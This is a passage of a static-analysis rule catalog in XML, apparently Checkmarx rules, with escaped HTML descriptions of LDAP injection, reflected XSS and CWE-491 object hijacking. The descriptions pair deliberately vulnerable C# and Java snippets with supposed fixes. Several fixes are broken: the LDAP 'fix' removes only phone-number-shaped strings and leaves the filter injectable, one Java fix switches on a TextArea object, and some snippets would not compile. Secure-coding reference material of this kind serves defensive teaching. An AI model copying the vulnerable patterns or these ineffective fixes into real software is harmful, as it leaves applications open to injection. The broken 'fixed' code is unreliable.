Taxonomy Mappings&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td valign="top" nowrap="" rowspan="2" style="border-bottom:1px solid #BAC5E3"&gt;2010-04-05&lt;/td&gt;&lt;td valign="top" nowrap=""&gt;CWE Content Team&lt;/td&gt;&lt;td valign="top"&gt;MITRE&lt;/td&gt;&lt;td valign="top" nowrap=""&gt;Internal&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td valign="top" colspan="3" style="border-bottom:1px solid #BAC5E3; font-size:90%; background-color:#eeeeee"&gt;updated Demonstrative Examples, Potential Mitigations&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;th valign="top" colspan="5" class="title"&gt;Previous Entry Names&lt;/th&gt;&lt;/tr&gt;&lt;tr&gt;&lt;th valign="top" nowrap=""&gt;Change Date&lt;/th&gt;&lt;th valign="top" nowrap="" colspan="3"&gt;Previous Entry
Name&lt;/th&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td valign="top" nowrap=""&gt;2008-04-11&lt;/td&gt;&lt;td valign="top" colspan="3"&gt;SQL
Injection&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td style="border-bottom:1px solid #BAC5E3" colspan="4"&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td valign="top" nowrap=""&gt;2008-09-09&lt;/td&gt;&lt;td valign="top" colspan="3"&gt;Failure to Sanitize Data into
SQL Queries (aka 'SQL Injection')&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td style="border-bottom:1px solid #BAC5E3" colspan="4"&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td valign="top" nowrap=""&gt;2009-01-12&lt;/td&gt;&lt;td valign="top" colspan="3"&gt;Failure to Sanitize Data
within SQL Queries (aka 'SQL Injection')&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td style="border-bottom:1px solid #BAC5E3" colspan="4"&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td valign="top" nowrap=""&gt;2009-05-27&lt;/td&gt;&lt;td valign="top" colspan="3"&gt;Failure to Preserve SQL Query
Structure (aka 'SQL Injection')&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td style="border-bottom:1px solid #BAC5E3" colspan="4"&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td valign="top" nowrap=""&gt;2009-07-27&lt;/td&gt;&lt;td valign="top" colspan="3"&gt;Failure to Preserve SQL Query
Structure ('SQL Injection')&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td style="border-bottom:1px solid #BAC5E3" colspan="4"&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/div&gt;&lt;/div&gt;&lt;/div&gt;&lt;/div&gt;

&lt;/html&gt;

&lt;div align="right" style="padding-top:5px; padding-bottom:5px; clear:right" class="noprint"&gt;&lt;a class="backtop" href="#top"&gt;Back to top&lt;/a&gt;&lt;/div&gt;

&lt;html xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"&gt;&lt;/html&gt;&lt;div style="display:none"&gt;]]&lt;/div&gt;</description><severity>MINOR</severity><tag>checkmarx-low</tag><type>VULNERABILITY</type></rule><rule><key>checkmarx_590</key><name>LDAP_Injection</name><description>&lt;div style="display:none"&gt;![CDATA[&lt;/div&gt;&lt;h2&gt;Risk&lt;/h2&gt;&lt;h4&gt;What might happen&lt;/h4&gt;&lt;p&gt;&lt;div&gt;An attacker could arbitrarily engineer the application&amp;#8217;s LDAP queries. Depending on how the application is using LDAP, the attacker could potentially do any of the following:&lt;/div&gt;
&lt;div&gt;
&lt;ul&gt;
&lt;ul&gt;
&lt;li&gt;Log in as another user&lt;/li&gt;
&lt;li&gt;Escalate privileges&lt;/li&gt;
&lt;li&gt;Steal information&lt;/li&gt;
&lt;/ul&gt;
&lt;/ul&gt;
&lt;/div&gt;      
&lt;/p&gt;&lt;hr&gt;&lt;h2&gt;Cause&lt;/h2&gt;&lt;h4&gt;How does it happen&lt;/h4&gt;&lt;p&gt;&lt;div&gt;The application communicates with an LDAP server, such as Active Directory, by sending a textual LDAP query or command. The application creates the query by simply concatenating strings including the user's input. Since the user input is neither checked for data type validity nor subsequently sanitized, the input could contain LDAP commands that would be interpreted as such by the LDAP server.&lt;/div&gt;      
&lt;/p&gt;&lt;hr&gt;&lt;h2&gt;General Recommendations&lt;/h2&gt;&lt;h4&gt;How to avoid it&lt;/h4&gt;&lt;p&gt;&lt;div&gt;Validate all input, regardless of source. Validation should be based on a whitelist: accept only data fitting a specified structure, rather than reject bad patterns. Check for:&lt;/div&gt;
&lt;div&gt;
&lt;ul&gt;
&lt;ul&gt;
&lt;li&gt;Data type&lt;/li&gt;
&lt;li&gt;Size&lt;/li&gt;
&lt;li&gt;Range&lt;/li&gt;
&lt;li&gt;Format&lt;/li&gt;
&lt;li&gt;Expected values&lt;/li&gt;
&lt;/ul&gt;
&lt;/ul&gt;
&lt;/div&gt;      
&lt;/p&gt;&lt;hr&gt;&lt;h2&gt;Source Code Examples&lt;/h2&gt;&lt;h3&gt;CSharp&lt;/h3&gt;&lt;h4&gt;
The application uses the "user" field string from an HttpRequest to communicate with an LDAP server
      &lt;/h4&gt;&lt;pre&gt;

public class LDAPInjection
{
        public void foo(HttpRequest Request, DirectorySearcher searcher)
        {
                string userName = Request.QueryString["user"];
                searcher.Filter = "(&amp;(samAccountName=" + userName + "))";
        }
}



      &lt;/pre&gt;&lt;h4&gt;
Potentially hazardous characters in the "user" string are removed
      &lt;/h4&gt;&lt;pre&gt;

public class LDAPInjectionFixed
{
        public void foo(HttpRequest Request, DirectorySearcher searcher)
        {
                string userName = Request.QueryString["user"];
                userName = Regex.Replace(userName, "^\\d{3}-\\d{3}-\\d{4}$", "");
                searcher.Filter = "(&amp;(samAccountName=" + userName + "))";
        }
}





      &lt;/pre&gt;&lt;div style="display:none"&gt;]]&lt;/div&gt;</description><severity>CRITICAL</severity><tag>checkmarx-high</tag><type>VULNERABILITY</type></rule><rule><key>checkmarx_1059</key><name>Potential_GWT_Reflected_XSS</name><description>&lt;div style="display:none"&gt;![CDATA[&lt;/div&gt;&lt;h2&gt;Risk&lt;/h2&gt;&lt;h4&gt;What might happen&lt;/h4&gt;&lt;p&gt;&lt;div&gt;An attacker could use social engineering to cause a user to send the website engineered input, rewriting web pages and inserting malicious scripts. The attacker can then pretend to be the original website, which would enable the attacker to steal the user's password, request the user&amp;#8217;s credit card information, provide false information, or run malware. From the victim&amp;#8217;s point of view, this is the original website, and the victim would blame the site for incurred damage.&lt;/div&gt;      
&lt;/p&gt;&lt;hr&gt;&lt;h2&gt;Cause&lt;/h2&gt;&lt;h4&gt;How does it happen&lt;/h4&gt;&lt;p&gt;&lt;div&gt;The application creates web pages that include data from previous user input. The user input is embedded directly in the page's HTML, causing the browser to display it as part of the web page. If the input includes HTML fragments or JavaScript, these are displayed too, and the user cannot tell that this is not the intended page. The vulnerability is the result of embedding arbitrary user input without first encoding it in a format that would prevent the browser from treating it like HTML instead of plain text.&lt;/div&gt;      
&lt;/p&gt;&lt;hr&gt;&lt;h2&gt;General Recommendations&lt;/h2&gt;&lt;h4&gt;How to avoid it&lt;/h4&gt;&lt;p&gt;&lt;ol&gt;
&lt;li&gt;Validate all input, regardless of source. Validation should be based on a whitelist: accept only data fitting a specified structure, rather than reject bad patterns. Check for:&lt;/li&gt;
&lt;ul&gt;
&lt;li&gt;Data type&lt;/li&gt;
&lt;li&gt;Size&lt;/li&gt;
&lt;li&gt;Range&lt;/li&gt;
&lt;li&gt;Format&lt;/li&gt;
&lt;li&gt;Expected values&lt;/li&gt;
&lt;/ul&gt;
&lt;li&gt;Fully encode all dynamic data before embedding it in output.&lt;/li&gt;
&lt;li&gt;Encoding should be context-sensitive. For example:&lt;/li&gt;
&lt;ul&gt;
&lt;li&gt;HTML encoding for HTML content&lt;/li&gt;
&lt;li&gt;HTML Attribute encoding for data output to attribute values&lt;/li&gt;
&lt;li&gt;JavaScript encoding for server-generated JavaScript.&lt;/li&gt;
&lt;/ul&gt;
&lt;li&gt;Consider using either the ESAPI encoding library, or the built-in platform functions. For earlier versions of ASP.NET, consider using the AntiXSS library.&lt;/li&gt;
&lt;li&gt;In the Content-Type HTTP response header, explicitly define character encoding (charset) for the entire page.&lt;/li&gt;
&lt;li&gt;Set the httpOnly flag on the session cookie, to prevent XSS exploits from stealing the cookie.&lt;/li&gt;
&lt;/ol&gt;      
&lt;/p&gt;&lt;hr&gt;&lt;h2&gt;Source Code Examples&lt;/h2&gt;&lt;h3&gt;CSharp&lt;/h3&gt;&lt;h4&gt;Bad - The application uses the "Referer" field string to construct the HttpResponse&lt;/h4&gt;&lt;pre&gt;public class ReflectedXssAllClients
{
        public static void foo(HttpRequest Request, HttpResponse Response)
        {
                string Referer = Request.QueryString["Referer"];
                Response.BinaryWrite(Referer);
        }
}&lt;/pre&gt;&lt;h4&gt;Good - The "Referer" field string is HTML encoded before use&lt;/h4&gt;&lt;pre&gt;public class ReflectedXssAllClientsFixed
{
        public static void foo(HttpRequest Request, HttpResponse Response, AntiXss.AntiXssEncoder encoder)
        {
                string Referer = Request.QueryString["Referer"];
                Response.BinaryWrite(encoder.HtmlEncode(Referer, true));
        }
}&lt;/pre&gt;&lt;h4&gt;Bad - User input is written to a TextBox displayed on the screen enabling a user to inject a script&lt;/h4&gt;&lt;pre&gt;public class ReflectedXSSSpecificClients
{
        public void foo(TextBox tb)
        {
                string input = Console.ReadLine();
                tb.Text = input;
        }
}&lt;/pre&gt;&lt;h4&gt;Good - The user input is HTML encoded before being displayed on the screen&lt;/h4&gt;&lt;pre&gt;public class ReflectedXSSSpecificClientsFixed
{
        public void foo(TextBox tb, AntiXssEncoder encode)
        {
                string input = Console.ReadLine();
                tb.Text = encode.HtmlEncode(input);
        }
}&lt;/pre&gt;&lt;h4&gt;Bad - The application uses the "filename" field string from an HttpRequest construct an HttpResponse&lt;/h4&gt;&lt;pre&gt;public class UTF7XSS
{
        public void foo(HttpRequest Request, HttpResponse Response
        {
                Response.Charset("UTF-7");
                string filename = Request.QueryString["filename"];
                Response.BinaryWrite(AntiXss.HtmlEncode(filename));
        }
}&lt;/pre&gt;&lt;h4&gt;Good - The "filename" string is converted to an int and using a switch case the new "filename" string is constructed&lt;/h4&gt;&lt;pre&gt;public class UTF7XSSFixed
{
        public static void foo(HttpRequest Request, HttpResponse Response)
        {
                Response.Charset("UTF-7");
                string filename = Request.QueryString["fileNum"];
                int fileNum = Convert.ToInt32(filename);
                
                switch(fileNum)
                {
                        case 1:
                                filename = "File1.txt";
                                break;
                        default:
                                filename = "File2.txt";
                                break;
                }
                
                Response.BinaryWrite(AntiXss.HtmlEncode(filename));
        }
}&lt;/pre&gt;&lt;h3&gt;Java&lt;/h3&gt;&lt;h4&gt;User input is written to a label displayed on the screen enabling a user to inject a script&lt;/h4&gt;&lt;pre&gt;public class ReflectedXSSAllClients {
	public static void XSSExample(TextArea name) {	
		Label label = new Label();		
		label.setText("Hello " + name.getText());	
	}
}&lt;/pre&gt;&lt;h4&gt;Switch case is used in order to assemble the label's text value and manage wrong user input&lt;/h4&gt;&lt;pre&gt;public class ReflectedXSSAllClientsFixed {
	public static void XSSExample(TextArea name) {
		Label label = new Label();		
		switch (name) {
		case "Joan":
			label.setText("Hello Joan");	
			break;
		case "Jim":
			label.setText("Hello Jim");	
			break;
		case "James":
			label.setText("Hello James");	
			break;
		default:
			System.out.println("Wrong Input");
		}
	}
}&lt;/pre&gt;&lt;div style="display:none"&gt;]]&lt;/div&gt;</description><severity>MINOR</severity><tag>checkmarx-low</tag><type>VULNERABILITY</type></rule><rule><key>checkmarx_1653</key><name>Object_Hijack</name><description>&lt;div style="display:none"&gt;![CDATA[&lt;/div&gt;&lt;html xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"&gt;
	&lt;link href="main.css" rel="stylesheet" type="text/css"&gt;
&lt;div id="CWEDefinition"&gt;&lt;div class="title"&gt;&lt;table cellpadding="0" cellspacing="0" border="0" width="100%"&gt;&lt;tr&gt;&lt;td valign="top" width="20px"&gt;&lt;/td&gt;&lt;td valign="top"&gt;&lt;div align="center"&gt;&lt;span style="font-weight:bold;color:white;"&gt;Public cloneable() Method Without Final ('Object Hijack')&lt;/span&gt;&lt;/div&gt;&lt;/td&gt;&lt;td valign="top" width="20px"&gt;&lt;div class="left noprint"&gt;

&lt;span class="tool"&gt;&lt;/span&gt;

&lt;/div&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/div&gt;&lt;div class="status"&gt;&lt;table width="100%" border="0" cellpadding="0" cellspacing="0"&gt;&lt;tr&gt;&lt;td valign="top" align="left" width="33%" nowrap=""&gt;&lt;b&gt;Weakness ID: &lt;/b&gt;491&lt;span style="font-style:italic; font-size:80%"&gt; (Weakness Variant)&lt;/span&gt;&lt;/td&gt;&lt;td valign="top" align="center" nowrap=""&gt;&lt;/td&gt;&lt;td valign="top" align="right" nowrap=""&gt;&lt;b&gt;Status: &lt;/b&gt;&lt;span class="Draft"&gt;Draft&lt;/span&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/div&gt;&lt;div id="Description"&gt;&lt;div class="heading"&gt;&lt;span id="script"&gt; &lt;/span&gt;Description&lt;/div&gt;&lt;div name="oc_491_Description" id="oc_491_Description" class="expandblock"&gt;&lt;div class="detail"&gt;
&lt;p class="subheading"&gt;Description Summary&lt;/p&gt;&lt;div class="indent"&gt;A class has a cloneable() method that is not declared final,
which allows an object to be created without calling the constructor. This can
cause the object to be in an unexpected state.&lt;/div&gt;
&lt;/div&gt;&lt;/div&gt;&lt;/div&gt;&lt;div id="Time of Introduction"&gt;&lt;div class="heading"&gt;&lt;span id="script"&gt; &lt;/span&gt;Time of Introduction&lt;/div&gt;&lt;div name="oc_491_Time of Introduction" id="oc_491_Time of Introduction" class="expandblock"&gt;&lt;div class="detail"&gt;&lt;ul&gt;
&lt;li&gt;Implementation&lt;/li&gt;
&lt;/ul&gt;&lt;/div&gt;&lt;/div&gt;&lt;/div&gt;&lt;div id="Applicable Platforms"&gt;&lt;div class="heading"&gt;&lt;span id="script"&gt; &lt;/span&gt;Applicable Platforms&lt;/div&gt;&lt;div name="oc_491_Applicable Platforms" id="oc_491_Applicable Platforms" class="expandblock"&gt;&lt;div class="detail"&gt;
&lt;p class="subheading"&gt;Languages&lt;/p&gt;&lt;div class="indent"&gt;
&lt;p&gt;Java&lt;/p&gt;
&lt;/div&gt;
&lt;/div&gt;&lt;/div&gt;&lt;/div&gt;&lt;div id="Demonstrative Examples"&gt;&lt;div class="heading"&gt;&lt;span id="script"&gt; &lt;/span&gt;Demonstrative Examples&lt;/div&gt;&lt;div name="oc_491_Demonstrative Examples" id="oc_491_Demonstrative Examples" class="expandblock"&gt;&lt;div class="detail"&gt;&lt;p class="subheading"&gt;Example 1&lt;/p&gt;&lt;p&gt;In this example, a public class "BankAccount" implements the
cloneable() method which declares "Object clone(string
accountnumber)":&lt;/p&gt;&lt;div class="indent Bad_Code"&gt;&lt;div id="ExampleCode" style="clear:both"&gt;&lt;div class="shadow"&gt;&lt;div class="CodeHead"&gt;&lt;div style="float:right; font-style:italic; font-size:10px; color:#98A9B7"&gt;(Bad Code)&lt;/div&gt;&lt;div class="optheading smaller"&gt;&lt;span style="font-weight:normal; font-style:italic"&gt;Example
Language: &lt;/span&gt;Java&amp;nbsp;&lt;/div&gt;&lt;/div&gt;&lt;div class="top"&gt;&lt;div style="font-size:90%;"&gt;public class BankAccount implements Cloneable{&lt;/div&gt;&lt;div class="indent "&gt;
&lt;div style="font-size:90%;"&gt;public Object clone(String accountnumber) throws&lt;/div&gt;
&lt;div style="font-size:90%;"&gt;CloneNotSupportedException&lt;/div&gt;
&lt;div style="font-size:90%;"&gt;{&lt;/div&gt;
&lt;div class="indent "&gt;
&lt;div style="font-size:90%;"&gt;Object returnMe = new BankAccount(account number);&lt;/div&gt;
&lt;div style="font-size:90%;"&gt;...&lt;/div&gt;
&lt;div style="font-size:90%;"&gt;&lt;br&gt;&lt;/div&gt;
&lt;/div&gt;
&lt;div style="font-size:90%;"&gt;}&lt;/div&gt;
&lt;/div&gt;&lt;div style="font-size:90%;"&gt;}&lt;/div&gt;&lt;/div&gt;&lt;/div&gt;&lt;/div&gt;&lt;/div&gt;&lt;p class="subheading"&gt;Example 2&lt;/p&gt;&lt;p&gt;In the example below, a clone() method is defined without being
declared final.&lt;/p&gt;&lt;div class="indent Bad_Code"&gt;&lt;div id="ExampleCode" style="clear:both"&gt;&lt;div class="shadow"&gt;&lt;div class="CodeHead"&gt;&lt;div style="float:right; font-style:italic; font-size:10px; color:#98A9B7"&gt;(Bad Code)&lt;/div&gt;&lt;div class="optheading smaller"&gt;&lt;span style="font-weight:normal; font-style:italic"&gt;Example
Language: &lt;/span&gt;Java&amp;nbsp;&lt;/div&gt;&lt;/div&gt;&lt;div class="top"&gt;&lt;div style="font-size:90%;"&gt;protected Object clone() throws CloneNotSupportedException
{&lt;/div&gt;&lt;div class="indent "&gt;
&lt;div style="font-size:90%;"&gt;...&lt;/div&gt;
&lt;/div&gt;&lt;div style="font-size:90%;"&gt;}&lt;/div&gt;&lt;/div&gt;&lt;/div&gt;&lt;/div&gt;&lt;/div&gt;&lt;/div&gt;&lt;/div&gt;&lt;/div&gt;&lt;div id="Potential Mitigations"&gt;&lt;div class="heading"&gt;&lt;span id="script"&gt; &lt;/span&gt;Potential Mitigations&lt;/div&gt;&lt;div name="oc_491_Potential Mitigations" id="oc_491_Potential Mitigations" class="expandblock"&gt;&lt;div class="detail"&gt;&lt;div id="Grouped"&gt;&lt;table width="100%" cellpadding="0" cellspacing="0" border="0" class="Detail"&gt;
&lt;tr&gt;&lt;td valign="top"&gt;&lt;p&gt;Make the cloneable() method final.&lt;/p&gt;&lt;/td&gt;&lt;/tr&gt;
&lt;/table&gt;&lt;/div&gt;&lt;/div&gt;&lt;/div&gt;&lt;/div&gt;&lt;div id="Relationships"&gt;&lt;div class="heading"&gt;&lt;span id="script"&gt; &lt;/span&gt;Relationships&lt;/div&gt;&lt;div name="oc_491_Relationships" id="oc_491_Relationships" class="expandblock"&gt;&lt;div class="tabledetail"&gt;&lt;table width="100%" cellpadding="0" cellspacing="0" border="0" id="Detail"&gt;&lt;tr&gt;&lt;th valign="top"&gt;Nature&lt;/th&gt;&lt;th valign="top"&gt;Type&lt;/th&gt;&lt;th valign="top"&gt;ID&lt;/th&gt;&lt;th valign="top" width="100%"&gt;Name&lt;/th&gt;&lt;th valign="middle" class="left" style="text-align:center"&gt;&lt;span class="tool"&gt;&lt;span class="tip"&gt;View(s) this relationship pertains to&lt;/span&gt;&lt;/span&gt;&lt;/th&gt;&lt;/tr&gt;
&lt;tbody&gt;&lt;tr class="primary"&gt;&lt;td valign="top"&gt;ChildOf&lt;/td&gt;&lt;td valign="top" nowrap="" class="right" align="center" style="padding-top:1px"&gt;&lt;span class="tool"&gt;&lt;span class="tip"&gt;Weakness Class&lt;/span&gt;&lt;/span&gt;&lt;/td&gt;&lt;td valign="top"&gt;485&lt;/td&gt;&lt;td valign="top"&gt;&lt;a href="cwe.aspx?cweid=485" target="_blank"&gt;Insufficient Encapsulation&lt;/a&gt;&lt;/td&gt;&lt;td valign="top"&gt;&lt;div class="left"&gt;&lt;b&gt;&lt;span class="tool"&gt;&lt;span class="tip"&gt;Seven Pernicious Kingdoms &lt;b&gt;(primary)&lt;/b&gt;&lt;/span&gt;700&lt;/span&gt;&lt;/b&gt;&lt;/div&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/tbody&gt;&lt;tbody&gt;&lt;tr class="primary"&gt;&lt;td valign="top"&gt;ChildOf&lt;/td&gt;&lt;td valign="top" nowrap="" class="right" align="center" style="padding-top:1px"&gt;&lt;span class="tool"&gt;&lt;span class="tip"&gt;Category&lt;/span&gt;&lt;/span&gt;&lt;/td&gt;&lt;td valign="top"&gt;490&lt;/td&gt;&lt;td valign="top"&gt;&lt;a href="cwe.aspx?cweid=490" target="_blank"&gt;Mobile Code Issues&lt;/a&gt;&lt;/td&gt;&lt;td valign="top"&gt;&lt;div class="left"&gt;&lt;b&gt;&lt;span class="tool"&gt;&lt;span class="tip"&gt;Development Concepts &lt;b&gt;(primary)&lt;/b&gt;&lt;/span&gt;699&lt;/span&gt;&lt;/b&gt;&lt;/div&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/tbody&gt;&lt;tbody&gt;&lt;tr class="primary"&gt;&lt;td valign="top"&gt;ChildOf&lt;/td&gt;&lt;td valign="top" nowrap="" class="right" align="center" style="padding-top:1px"&gt;&lt;span class="tool"&gt;&lt;span class="tip"&gt;Weakness Class&lt;/span&gt;&lt;/span&gt;&lt;/td&gt;&lt;td valign="top"&gt;668&lt;/td&gt;&lt;td valign="top"&gt;&lt;a href="cwe.aspx?cweid=668" target="_blank"&gt;Exposure of Resource to Wrong Sphere&lt;/a&gt;&lt;/td&gt;&lt;td valign="top"&gt;&lt;div class="left"&gt;&lt;b&gt;&lt;span class="tool"&gt;&lt;span class="tip"&gt;Research Concepts &lt;b&gt;(primary)&lt;/b&gt;&lt;/span&gt;1000&lt;/span&gt;&lt;/b&gt;&lt;/div&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/tbody&gt;

&lt;/table&gt;&lt;/div&gt;&lt;/div&gt;&lt;/div&gt;&lt;div id="Taxonomy Mappings"&gt;&lt;div class="heading"&gt;&lt;span id="script"&gt; &lt;/span&gt;Taxonomy Mappings&lt;/div&gt;&lt;div name="oc_491_Taxonomy Mappings" id="oc_491_Taxonomy Mappings" class="expandblock"&gt;&lt;div class="tabledetail"&gt;&lt;table width="100%" cellpadding="0" cellspacing="0" border="0" class="Detail"&gt;&lt;tr&gt;&lt;th valign="top" nowrap=""&gt;Mapped Taxonomy Name&lt;/th&gt;&lt;th valign="top" nowrap=""&gt;Node ID&lt;/th&gt;&lt;th valign="top" nowrap=""&gt;Fit&lt;/th&gt;&lt;th valign="top" width="100%"&gt;Mapped Node Name&lt;/th&gt;&lt;/tr&gt;
&lt;tr&gt;&lt;td valign="top"&gt;7 Pernicious Kingdoms&lt;/td&gt;&lt;td valign="top"&gt;&lt;/td&gt;&lt;td valign="top" nowrap=""&gt;&lt;/td&gt;&lt;td valign="top"&gt;Mobile Code: Object Hijack&lt;/td&gt;&lt;/tr&gt;
&lt;/table&gt;&lt;/div&gt;&lt;/div&gt;&lt;/div&gt;&lt;div id="References"&gt;&lt;div class="heading"&gt;&lt;span id="script"&gt; &lt;/span&gt;References&lt;/div&gt;&lt;div name="oc_491_References" id="oc_491_References" class="expandblock"&gt;&lt;div class="detail"&gt;&lt;div id="Grouped"&gt;&lt;table width="100%" cellpadding="0" cellspacing="0" border="0" class="Detail"&gt;
&lt;tr&gt;&lt;td valign="top"&gt;OWASP. "OWASP , Attack Category : Mobile code: object
hijack". &amp;lt;&lt;a href="http://www.owasp.org/index.php/Mobile_code:_object_hijack" target="_blank"&gt;http://www.owasp.org/index.php/Mobile_code:_object_hijack&lt;/a&gt;&amp;gt;.&lt;/td&gt;&lt;/tr&gt;
&lt;/table&gt;&lt;/div&gt;&lt;/div&gt;&lt;/div&gt;&lt;/div&gt;&lt;div id="Content History"&gt;&lt;div class="heading"&gt;&lt;span id="script"&gt; &lt;/span&gt;Content History&lt;/div&gt;&lt;div name="oc_491_Content History" id="oc_491_Content History" class="expandblock"&gt;&lt;div class="tabledetail"&gt;&lt;table width="100%" cellpadding="0" cellspacing="0" border="0" class="Detail"&gt;&lt;tr&gt;&lt;th valign="top" colspan="5" class="title"&gt;Submissions&lt;/th&gt;&lt;/tr&gt;&lt;tr&gt;&lt;th valign="top" nowrap=""&gt;Submission Date&lt;/th&gt;&lt;th valign="top" nowrap=""&gt;Submitter&lt;/th&gt;&lt;th valign="top" nowrap=""&gt;Organization&lt;/th&gt;&lt;th valign="top" nowrap=""&gt;Source&lt;/th&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td valign="top" nowrap="" rowspan="2" style="border-bottom:1px solid #BAC5E3"&gt;&lt;/td&gt;&lt;td valign="top" nowrap=""&gt;7 Pernicious Kingdoms&lt;/td&gt;&lt;td valign="top"&gt;&lt;/td&gt;&lt;td valign="top" nowrap=""&gt;Externally Mined&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td valign="top" colspan="3" style="border-bottom:1px solid #BAC5E3; font-size:90%; background-color:#eeeeee"&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;th valign="top" colspan="5" class="title"&gt;Modifications&lt;/th&gt;&lt;/tr&gt;&lt;tr&gt;&lt;th valign="top" nowrap=""&gt;Modification Date&lt;/th&gt;&lt;th valign="top" nowrap=""&gt;Modifier&lt;/th&gt;&lt;th valign="top" nowrap=""&gt;Organization&lt;/th&gt;&lt;th valign="top" nowrap=""&gt;Source&lt;/th&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td valign="top" nowrap="" rowspan="2" style="border-bottom:1px solid #BAC5E3"&gt;2008-07-01&lt;/td&gt;&lt;td valign="top" nowrap=""&gt;Sean Eidemiller&lt;/td&gt;&lt;td valign="top"&gt;Cigital&lt;/td&gt;&lt;td valign="top" nowrap=""&gt;External&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td valign="top" colspan="3" style="border-bottom:1px solid #BAC5E3; font-size:90%; background-color:#eeeeee"&gt;added/updated demonstrative
examples&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td valign="top" nowrap="" rowspan="2" style="border-bottom:1px solid #BAC5E3"&gt;2008-07-01&lt;/td&gt;&lt;td valign="top" nowrap=""&gt;Eric Dalci&lt;/td&gt;&lt;td valign="top"&gt;Cigital&lt;/td&gt;&lt;td valign="top" nowrap=""&gt;External&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td valign="top" colspan="3" style="border-bottom:1px solid #BAC5E3; font-size:90%; background-color:#eeeeee"&gt;updated References, Demonstrative Example,
Potential Mitigations, Time of Introduction&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td valign="top" nowrap="" rowspan="2" style="border-bottom:1px solid #BAC5E3"&gt;2008-09-08&lt;/td&gt;&lt;td valign="top" nowrap=""&gt;CWE Content Team&lt;/td&gt;&lt;td valign="top"&gt;MITRE&lt;/td&gt;&lt;td valign="top" nowrap=""&gt;Internal&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td valign="top" colspan="3" style="border-bottom:1px solid #BAC5E3; font-size:90%; background-color:#eeeeee"&gt;updated Relationships, References,
Taxonomy Mappings&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td valign="top" nowrap="" rowspan="2" style="border-bottom:1px solid #BAC5E3"&gt;2009-05-27&lt;/td&gt;&lt;td valign="top" nowrap=""&gt;CWE Content Team&lt;/td&gt;&lt;td valign="top"&gt;MITRE&lt;/td&gt;&lt;td valign="top" nowrap=""&gt;Internal&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td valign="top" colspan="3" style="border-bottom:1px solid #BAC5E3; font-size:90%; background-color:#eeeeee"&gt;updated Name&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td valign="top" nowrap="" rowspan="2" style="border-bottom:1px solid #BAC5E3"&gt;2009-07-27&lt;/td&gt;&lt;td valign="top" nowrap=""&gt;CWE Content Team&lt;/td&gt;&lt;td valign="top"&gt;MITRE&lt;/td&gt;&lt;td valign="top" nowrap=""&gt;Internal&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td valign="top" colspan="3" style="border-bottom:1px solid #BAC5E3; font-size:90%; background-color:#eeeeee"&gt;updated Demonstrative Examples&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;th valign="top" colspan="5" class="title"&gt;Previous Entry Names&lt;/th&gt;&lt;/tr&gt;&lt;tr&gt;&lt;th valign="top" nowrap=""&gt;Change Date&lt;/th&gt;&lt;th valign="top" nowrap="" colspan="3"&gt;Previous Entry
Name&lt;/th&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td valign="top" nowrap=""&gt;2008-04-11&lt;/td&gt;&lt;td valign="top" colspan="3"&gt;Mobile Code: Object
Hijack&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td style="border-bottom:1px solid #BAC5E3" colspan="4"&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td valign="top" nowrap=""&gt;2009-05-27&lt;/td&gt;&lt;td valign="top" colspan="3"&gt;Public cloneable() Method
Without Final (aka 'Object Hijack')&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td style="border-bottom:1px solid #BAC5E3" colspan="4"&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/div&gt;&lt;/div&gt;&lt;/div&gt;&lt;/div&gt;

&lt;/html&gt;

&lt;div align="right" style="padding-top:5px; padding-bottom:5px; clear:right" class="noprint"&gt;&lt;a class="backtop" href="#top"&gt;Back to top&lt;/a&gt;&lt;/div&gt;

